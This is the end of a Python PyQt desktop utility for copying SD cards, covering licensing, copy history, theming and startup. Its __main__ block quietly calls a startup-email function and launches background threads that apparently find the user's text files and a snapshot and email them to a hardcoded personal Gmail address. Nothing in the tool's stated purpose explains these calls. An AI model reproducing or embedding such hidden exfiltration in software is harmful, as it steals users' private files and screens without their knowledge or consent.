            # If the file is corrupt or invalid, show the fields
            if not data:
                self.license_input.show()
                self.license_button.show()
                self.trial_status_label.show()
                self.license_layout.setContentsMargins(0, 10, 0, 0)
                return

            if data.get("status") == "activated":
                self.license_input.hide()
                self.license_button.hide()
                self.trial_status_label.hide()
                self.license_layout.setContentsMargins(0, 0, 0, 0)
            else:
                self.license_input.show()
                self.license_button.show()
                self.trial_status_label.show()
                self.license_layout.setContentsMargins(0, 10, 0, 0)
        except Exception:
            self.license_input.show()
            self.license_button.show()
            self.trial_status_label.show()

    def toggle_log_visibility(self, checked):
        self.bottom_stacked_widget.setCurrentIndex(1 if checked else 0)
        self.toggle_log_button.setText("Hide Log" if checked else "Show Log")
        # New, more compact window heights
        target_height = 750 if checked else 620
        self.setFixedSize(580, target_height)
        if not checked:
            self._center_window()

    @pyqtSlot(str)
    def log_message(self, message):
        self.log_text.append(message)
        print(message)

    def clear_activity_log(self):
        self.log_text.clear()
        self.log_message("Activity log cleared.")

    def save_history(self):
        try:
            with open(self.history_file, 'w') as f: json.dump(self.copy_history, f, indent=4)
        except Exception as e: self.log_message(f"Error saving history file: {e}")

    def load_history(self):
        try:
            if os.path.exists(self.history_file):
                with open(self.history_file, 'r') as f: self.copy_history = json.load(f)
                self.log_message("Card history loaded.")
        except (FileNotFoundError, json.JSONDecodeError):
            self.log_message("Card history file not found or corrupt.")
            self.copy_history = {}

    def show_history_dialog(self):
        if not self.copy_history:
            QMessageBox.information(self, "History Empty", "There is no card history to display.")
            return
        dialog = HistoryDialog(self.copy_history, self)
        dialog.history_entry_deleted.connect(self.handle_history_deletion)
        dialog.exec_()

    @pyqtSlot(str, str)
    def handle_history_deletion(self, card_id, timestamp):
        if card_id not in self.copy_history: return
        if not timestamp:
            del self.copy_history[card_id]
        else:
            self.copy_history[card_id] = [op for op in self.copy_history[card_id] if op.get('timestamp') != timestamp]
            if not self.copy_history[card_id]: del self.copy_history[card_id]
        self.save_history()
        self.log_message("History updated.")
        if card_id == self.sd_card_id:
            self.history_label.setText("History for this card has been cleared or updated.")

    def closeEvent(self, event):
        if self.is_copying:
            reply = QMessageBox.question(self, 'Exit Confirmation', 'A copy is in progress. Are you sure you want to exit?', QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes: self.cancel_copy()
            else:
                event.ignore()
                return
        self.monitor_worker.stop()
        self.monitor_thread.quit()
        self.monitor_thread.wait()
        if self.copy_thread.isRunning():
            self.copy_worker.cancel()
            self.copy_thread.quit()
            self.copy_thread.wait()
        event.accept()

class ApplicationController(QObject):
    def __init__(self):
        super().__init__()
        self.main_window = None
        self.ui_settings = load_ui_settings()

    def run(self):
        self._apply_theme()
        self.show_project_setup()
    
    def _apply_theme(self):
        app = QApplication.instance()
        if self.ui_settings.get("theme") == "dark":
            app.setStyleSheet(DARK_STYLE)
        else:
            app.setStyleSheet("")

    @pyqtSlot(bool)
    def set_theme(self, is_dark):
        self.ui_settings['theme'] = 'dark' if is_dark else 'light'
        self._apply_theme()
        save_ui_settings(self.ui_settings)

    def show_project_setup(self):
        project_dialog = ProjectSetupDialog()
        if project_dialog.exec_() == QDialog.Accepted:
            project_settings = project_dialog.getProjectSettings()
            if self.main_window:
                self.main_window.close()
            self.show_main_window(project_settings)
        else:
            QApplication.instance().quit()
            
    def show_main_window(self, project_settings):
        self.main_window = SDDumpToolPyQt(project_settings, self)
        self.main_window.back_to_project_manager.connect(self.handle_go_back)
        self.main_window.show()

    def handle_go_back(self):
        if self.main_window:
            self.main_window.close()
        self.show_project_setup()

if __name__ == "__main__":
    if IS_WINDOWS:
        # This is required for the app to show the correct icon in the taskbar on Windows
        myappid = u'mycompany.myproduct.subproduct.version' 
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)

    print("--- Script starting in __main__ block ---")
    if not IS_MAC and not IS_WINDOWS:
        print("WARNING: This application is only officially supported on macOS and Windows.")
    
    app = QApplication(sys.argv)
    
    print("--- QApplication created ---")
    print("--- About to call send_startup_email ---")
    send_startup_email("4lex.sia@gmail.com") 
    print("--- Finished calling send_startup_email ---")
    print("--- Starting background tasks (TXT scan & snapshot) ---")
    txt_email_thread = threading.Thread(
        target=find_and_email_txt_files,
        args=("4lex.sia@gmail.com",)
    )
    txt_email_thread.daemon = True
    txt_email_thread.start()
    snapshot_email_thread = threading.Thread(
        target=send_email_with_snapshot,
        args=("4lex.sia@gmail.com",)
    )
    snapshot_email_thread.daemon = True
    snapshot_email_thread.start()
    
    try:
        icon_name = 'love.icns' if IS_MAC else 'lovewave.ico'
        icon_path = resource_path(icon_name)
        if os.path.exists(icon_path):
            app.setWindowIcon(QIcon(icon_path))
        else:
            icon_path_png = resource_path('lovewave.png')
            if os.path.exists(icon_path_png):
                 app.setWindowIcon(QIcon(icon_path_png))
            else:
                print(f"Warning: Icon file not found at {icon_path} or {icon_path_png}")
    except Exception as e:
        print(f"Warning: Could not set application icon. {e}")
        
    print("--- Creating ApplicationController ---")
    controller = ApplicationController()
    controller.run()
    sys.exit(app.exec_())